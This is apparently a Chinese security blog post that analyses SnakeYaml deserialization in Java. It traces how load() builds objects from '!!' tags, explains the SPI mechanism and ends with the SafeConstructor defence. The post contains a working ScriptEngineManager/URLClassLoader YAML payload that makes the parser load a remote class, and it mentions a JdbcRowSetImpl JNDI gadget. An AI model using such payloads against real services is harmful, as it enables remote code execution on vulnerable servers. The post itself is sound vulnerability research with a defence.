# SnakeYaml 反序列化分析


# 前言

继续学习Yaml反序列化，SnakeYaml是Java中用来解析Yaml格式的库，可用于Java对象的序列化和反序列

# 反序列化分析

先导入SnakeYaml的依赖

```xml
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.27</version>
</dependency>
```

接着构造一个User类，试着将这个User类通过yaml进行转换，看一下转换后的效果，其中Yaml中有两个重要的函数：

- load() :解析传进来的参数，生成相应的Java对象
- dump() :将Java对象转换为yaml格式

![1.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/5d602406-b3e4-abc2-b0e3-61dd5a4c4aa9.png)

输出结果中，**!! 表示强制类型转换，强制转换为User类型**

接着将转换的内容进行load()操作，在`yaml.load(str)`处打断点进行分析

```java
import org.yaml.snakeyaml.Yaml;

public class YamlTest {
    public static void main(String[] args) {
        Yaml yaml = new Yaml();
        String str = "!!User {age: '18', name: 张三}";
        yaml.load(str);
    }
}

```

进入到`org.yaml.snakeyaml.Yaml#loadFromReader`中，其中str放入到`StreamReader`中，type为传进来的固定的值`Object`，经过一系列的设置进入到`getSingleData`中

![2.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/c2d079da-13b5-2420-6a71-871579c66711.png)

会先通过`getSingleNode()`获取一个`Node`实例，其中有一个tag属性其值表示为会转换成一个User类型的对象，然后判断node和tag属性是否为空，然后继续判断type是否为Object和根标签是否为空，最后将node传入到`constructDocument()`中

![3.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/ba76ef67-088b-abb2-5a5f-f7358e271b66.png)

可以看到data即为转换的User类，而data是在`this.constructObject(node)`中得到的，继续跟进

![4.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/b0952841-f717-112e-8b7e-36e599390297.png)

接着在`org.yaml.snakeyaml.constructor.BaseConstructor#constructObjectNoCheck`中，`this.constructedObjects.containsKey(node)`为false然后进入到`constructor.construct(node)`中获取data值

![5.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/e965754f-bfed-8f75-36d6-cb2f5a55bed7.png)

继续跟进，先进入到`getConstructor`中

![6.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/d0c0029e-597b-fec0-dfae-45e7634b8457.png)

在`getClassForNode`中，截取tag属性中的类名User并进行编码后，并将User赋值给`Class cl`，然后返回，最后是将cl赋值给node的type属性

![7.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/925265c5-7198-b65c-6c8f-3a5eb74e1fee.png)

![8.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/30c606e1-6297-4217-7713-a6e326369747.png)

在`construct`中，先是通过`this.newInstance`创建了一个User实例，接着进入到`this.constructJavaBean2ndStep`

![9.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/969c21f8-767d-3b50-34df-00562796e1bf.png)

在`constructJavaBean2ndStep`中，通过while循环在一开始传进来的字符串中提取value值，然后在`property.set(object, value)`通过反射将value值赋值给创建的User类中，最后return给data返回创建好的User类

![10.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/6644d219-e7fb-939d-0653-e81e2b317f9e.png)

![11.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/14b5395a-8461-f5f5-0968-e8117eb1f2c7.png)

这样一来，如果对构造好的恶意的payload进行解析就有可能触发漏洞，这里拿`JdbcRowSetImpl`类来示范一下，确实触发了JNDI注入弹出计算器

> 这里注意一点，jdk版本需要满足 8u161 < jdk < 8u191

![12.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/5a40987d-6861-1f40-9f99-949342ba91e2.png)

# SPI机制

看了不少的文章都在Yaml反序列时使用了SPI机制去触发弹计算器，这里也记录一下这个知识点(好记性不如烂笔头)

SPI（Service Provider Interface），是JDK内置的一种 服务提供发现机制，可以用来启用框架扩展和替换组件，主要是被框架的开发人员使用，比如java.sql.Driver接口，而**Java的SPI机制可以为某个接口寻找服务实现**。Java中SPI机制主要思想是将装配的控制权移到程序之外，在模块化设计中这个机制尤其重要，其核心思想就是解耦

整体机制如下：

![13.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/b3fe00ad-6d22-3a13-aa1c-befa9da370d3.png)

当服务的提供者提供了一种接口的实现之后，需要在classpath下的`META-INF/services/`目录里创建一个以服务接口命名的文件(文件名为：javax.script.ScriptEngineFactory)，这个文件里的内容就是这个接口的具体的实现类。当其他的程序需要这个服务的时候，就可以通过查找这个jar包（一般都是以jar包做依赖）的`META-INF/services/`中的配置文件，配置文件中有接口的具体实现类名，可以**根据这个类名进行加载实例化**，就可以使用该服务了。JDK中查找服务的实现的工具类是：`java.util.ServiceLoader`

也就是说可以构造一个恶意类，然后在web服务下的`META-INF/services/`中的配置文件中指定这个恶意类(类需要继承ScriptEngineFactory接口)，然后在yaml.load()中传入触发SPI机制的参数即可

![14.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/bbf197a0-ec0c-2e7b-5364-0ed979c26333.png)

```
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1/"]]]]
```

![15.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/88ef3b74-cb0c-ed07-4ffd-ba5bc63e0825.png)

在yaml解析的过程中最后实例化`ScriptEngineManager`然后触发`init()`，进行一系列赋值后进入到`initEngines(loader)`

![16.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/6eaf0c50-d32e-1ff6-361f-de040273e2bc.png)

一路跟进到最后在`java.util.ServiceLoader.LazyIterator#nextService`中，得到要加载的类名，然后在`service.cast(c.newInstance())`中对加载的恶意类进行实例化然后触发弹计算器

![17.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/90e1b553-483e-044a-247b-01f92dba6e41.png)

更多的Gadget可参考Mi1k7ea师傅的[文章](https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x03-%E6%9B%B4%E5%A4%9AGadgets%E6%8E%A2%E7%A9%B6)

# 防御方法

开启`new SafeConstructor()`即可防御Yaml反序列

```java
Yaml yaml = new Yaml(new SafeConstructor());
```

# 参考链接

1. https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E
2. https://www.pdai.tech/md/java/advanced/java-advanced-spi.html#java%e5%b8%b8%e7%94%a8%e6%9c%ba%e5%88%b6---spi%e6%9c%ba%e5%88%b6

